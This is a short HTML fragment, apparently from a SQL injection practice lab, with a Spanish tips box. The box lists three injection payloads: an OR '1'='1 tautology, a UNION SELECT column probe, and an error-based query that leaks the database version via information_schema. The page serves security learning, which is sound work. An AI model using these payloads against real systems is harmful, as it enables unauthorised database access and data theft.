...
<body>
    ...
    <main>
        ...
        <div class="tips-section">
            <h3>💡 Tips para testing SQLi:</h3>
            <ul>
                <li>Prueba: <code>' OR '1'='1</code></li>
                <li>Union: <code>' UNION SELECT 1,2,3,4,5--</code></li>
                <li>Error-based: <code>' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--</code></li>
            </ul>
        </div>
    </main>
</body>
